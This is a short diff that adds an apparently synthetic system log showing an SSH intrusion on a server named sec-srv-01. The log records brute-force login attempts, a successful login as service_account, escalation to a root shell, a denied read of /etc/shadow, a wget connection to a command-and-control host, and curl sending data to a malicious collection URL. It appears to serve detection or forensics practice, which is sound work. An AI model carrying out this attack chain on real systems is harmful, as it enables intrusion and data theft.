@@ -1,0 +1,11 @@
+Oct 25 04:12:01 sec-srv-01 sshd[14201]: Failed password for invalid user admin from 198.51.100.45 port 49152 ssh2
+Oct 25 04:12:03 sec-srv-01 sshd[14203]: Failed password for invalid user admin from 198.51.100.45 port 49154 ssh2
+Oct 25 04:12:06 sec-srv-01 sshd[14206]: Failed password for invalid user root from 198.51.100.45 port 49158 ssh2
+Oct 25 04:12:09 sec-srv-01 sshd[14210]: Failed password for invalid user test from 198.51.100.45 port 49162 ssh2
+Oct 25 04:12:12 sec-srv-01 sshd[14214]: Failed password for service_account from 198.51.100.45 port 49166 ssh2
+Oct 25 04:12:18 sec-srv-01 sshd[14220]: Accepted password for service_account from 198.51.100.45 port 49170 ssh2
+Oct 25 04:12:19 sec-srv-01 systemd-logind[780]: New session 42 of user service_account.
+Oct 25 04:12:35 sec-srv-01 sudo: service_account : TTY=pts/2 ; PWD=/home/service_account ; USER=root ; COMMAND=/bin/bash
+Oct 25 04:13:02 sec-srv-01 kernel: [41289.124] audit: type=1400 audit(1729829582.124:99): apparmor="DENIED" operation="open" name="/etc/shadow"
+Oct 25 04:13:45 sec-srv-01 wget[14305]: Connecting to c2-stealth-update.net:443... connected.
+Oct 25 04:14:10 sec-srv-01 curl[14312]: Exfiltrating payload to https://data-drop.malicious-domain.org/collect?node=sec-srv-01
